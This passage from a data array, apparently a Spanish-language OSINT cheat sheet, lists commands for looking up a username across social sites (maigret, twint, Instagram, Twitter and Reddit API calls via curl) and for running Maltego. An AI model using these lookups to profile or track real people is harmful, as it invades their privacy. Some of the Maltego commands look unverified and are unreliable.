   {
    "cmd": "maigret -a usuario",
    "desc": "Todos los sites"
   },
   {
    "cmd": "maigret -o out.json usuario",
    "desc": "JSON"
   },
   {
    "cmd": "curl -s 'https://www.instagram.com/api/v1/users/web_profile_info/?username=usuario' -H 'X-IG-App-ID: 936619743392459' | jq .",
    "desc": "IG API"
   },
   {
    "cmd": "curl -s 'https://api.twitter.com/1.1/users/show.json?screen_name=usuario' -H 'Authorization: Bearer TOKEN' | jq .",
    "desc": "Twitter API"
   },
   {
    "cmd": "twint -u usuario -o tw.csv --csv",
    "desc": "Twint"
   },
   {
    "cmd": "curl -s 'https://www.reddit.com/user/usuario.json' | jq '.data.children[0].data'",
    "desc": "Reddit"
   }
  ]
 },
 {
  "tool": "maltego-cli",
  "desc": "Maltego (recon relacional)",
  "commands": [
   {
    "cmd": "maltego",
    "desc": "GUI"
   },
   {
    "cmd": "maltego -p MaltegoXL",
    "desc": "Profile"
   },
   {
    "cmd": "maltego -p MaltegoCE",
    "desc": "CE"
   },
   {
    "cmd": "maltego -p CaseFile",
    "desc": "CaseFile"
   },
   {
    "cmd": "maltego -x",
    "desc": "Offline"
   },
   {
    "cmd": "curl -s 'http://IP:8080/api' -H 'Accept: application/json' | jq .",
    "desc": "Server API"
   },
   {
    "cmd": "curl -s 'http://localhost:8080/api/seed' | jq .",
    "desc": "Seeds"
   },
   {
    "cmd": "maltego --server localhost:8080",
    "desc": "Server"
   },
   {
    "cmd": "ls /opt/maltego/",
    "desc": "Instalación"
   },
   {
    "cmd": "python3 -c 'import maltego'",
    "desc": "API"
   }
  ]
 }
];
